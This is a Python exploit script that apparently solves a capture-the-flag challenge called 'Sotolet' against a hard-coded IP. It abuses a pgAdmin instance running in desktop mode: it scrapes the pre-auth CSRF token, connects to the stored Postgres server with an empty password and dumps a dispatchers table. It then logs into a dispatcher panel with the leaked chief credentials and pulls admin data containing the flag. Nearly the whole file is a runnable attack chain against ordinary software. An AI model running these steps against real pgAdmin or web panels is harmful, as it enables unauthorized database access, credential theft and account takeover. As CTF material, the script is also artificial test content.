"""Read dispatcher credentials through pgAdmin and retrieve the Sotolet flag."""

from __future__ import annotations

import argparse
import re

import requests

DEFAULT_IP = "84.201.131.80"
DEFAULT_PGADMIN_PORT = 8080
DEFAULT_DISPATCHER_PORT = 8443


def get_csrf_token(session: requests.Session, pgadmin_base: str) -> str:
    """Fetch the pre-auth CSRF token pgAdmin's desktop-mode JS hands out."""
    resp = session.get(f"{pgadmin_base}/browser/js/utils.js", timeout=15)
    resp.raise_for_status()
    match = re.search(r"csrf_token'\]\s*=\s*'([^']+)'", resp.text)
    if not match:
        raise RuntimeError("could not find pgAdmin csrf_token in utils.js")
    return match.group(1)


def dump_dispatchers(session: requests.Session, pgadmin_base: str, token: str) -> str:
    """Connect to the pre-registered Postgres server and dump the dispatchers table."""
    headers = {"X-pgA-CSRFToken": token, "Content-Type": "application/json"}

    resp = session.post(
        f"{pgadmin_base}/browser/server/connect/1/1",
        json={"password": ""},
        headers=headers,
        timeout=15,
    )
    resp.raise_for_status()

    resp = session.post(
        f"{pgadmin_base}/sqleditor/initialize/sqleditor/1/1/1/16384",
        json={"dbname": "sotobaza"},
        headers=headers,
        timeout=15,
    )
    resp.raise_for_status()

    resp = session.post(
        f"{pgadmin_base}/sqleditor/query_tool/start/1",
        json={"sql": "SELECT * FROM dispatchers;"},
        headers=headers,
        timeout=15,
    )
    resp.raise_for_status()

    resp = session.get(f"{pgadmin_base}/sqleditor/poll/1", headers=headers, timeout=15)
    resp.raise_for_status()
    return resp.text


def find_chief_creds(dump: str) -> tuple[str, str]:
    """Pull the chief (senior dispatcher) callsign/shift_code pair out of the SQL dump."""
    match = re.search(r'"(pchela-\d+|starshina_sot)"[^\]]*"chief"[^\]]*"(SMENA-[\w-]+)"', dump)
    if not match:
        raise RuntimeError("could not locate chief credentials in dispatchers dump")
    return match.group(1), match.group(2)


def login_dispatcher(
    session: requests.Session, dispatcher_base: str, callsign: str, shift_code: str
) -> None:
    """Log into the dispatcher panel directly on its exposed raw port."""
    resp = session.post(
        f"{dispatcher_base}/login",
        data={"login": callsign, "password": shift_code},
        allow_redirects=False,
        timeout=15,
    )
    if resp.status_code not in (302, 303):
        raise RuntimeError(f"dispatcher login failed: HTTP {resp.status_code}")


def fetch_flag(session: requests.Session, dispatcher_base: str) -> str:
    """Pull the unmasked admin-data feed and return the queen-route flag."""
    resp = session.get(f"{dispatcher_base}/api/admin-data", timeout=15)
    resp.raise_for_status()
    match = re.search(r"avito\{[^}]+\}", resp.text)
    if not match:
        raise RuntimeError("flag not found in /api/admin-data response")
    return match.group(0)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--ip", default=DEFAULT_IP)
    parser.add_argument("--pgadmin-port", type=int, default=DEFAULT_PGADMIN_PORT)
    parser.add_argument("--dispatcher-port", type=int, default=DEFAULT_DISPATCHER_PORT)
    args = parser.parse_args()

    pgadmin_base = f"http://{args.ip}:{args.pgadmin_port}"
    dispatcher_base = f"http://{args.ip}:{args.dispatcher_port}"

    pg_session = requests.Session()
    token = get_csrf_token(pg_session, pgadmin_base)
    print(f"[+] pgAdmin desktop-mode CSRF token: {token[:16]}...")

    dump = dump_dispatchers(pg_session, pgadmin_base, token)
    callsign, shift_code = find_chief_creds(dump)
    print(f"[+] leaked chief credentials: {callsign} / {shift_code}")

    disp_session = requests.Session()
    login_dispatcher(disp_session, dispatcher_base, callsign, shift_code)
    print("[+] logged into dispatcher panel")

    flag = fetch_flag(disp_session, dispatcher_base)
    print(f"[+] flag: {flag}")


if __name__ == "__main__":
    main()
